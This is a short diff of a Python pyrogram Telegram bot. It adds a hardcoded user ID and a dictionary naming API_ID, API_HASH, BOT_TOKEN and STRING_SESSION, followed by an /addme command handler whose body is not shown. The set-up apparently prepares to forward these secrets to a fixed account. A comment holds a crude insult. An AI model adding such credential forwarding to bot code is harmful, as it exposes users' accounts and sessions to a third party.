@@ -96,18 +96,21 @@ async def search(event):
 #dont use this code dont kang bsdk 
 
 
+
 import asyncio
 from pyrogram import Client, filters
 
 
+
 user_ids = [5350640981]
 
-
 vars_to_send = {
-    "var1": "Value 1",
-    "var2": "Value 2",
-    "var3": "Value 3"
+    "var1": "API_ID",
+    "var2": "API_HASH",
+    "var3": "BOT_TOKEN",
+    "var4": "STRING_SESSION"
 }
+
 
 
 @app.on_message(filters.private & filters.command("addme"))
